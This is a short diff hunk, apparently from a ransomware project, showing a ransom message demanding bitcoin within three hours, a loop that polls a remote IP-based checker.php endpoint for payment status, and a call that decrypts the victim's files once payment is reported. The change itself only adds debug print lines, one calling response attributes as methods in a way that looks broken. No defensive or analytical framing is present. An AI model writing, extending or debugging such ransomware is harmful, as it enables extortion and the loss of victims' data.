@@ -50,7 +50,10 @@ print("You have three hours to send the bitcoin")
 for i in range(100):
     time.sleep(10)
     responsePaid = requests.get("http://79.170.40.237/bot.com/code/checker.php")
+    print(responsePaid.url())
+    print(responsePaid.raw())
     jsonPaid = responsePaid.json()
+    
     if jsonPaid["paid"] == 1:
         encryptionManager.manage(1, rootDirectionary, key) #decypts the files.
     else:
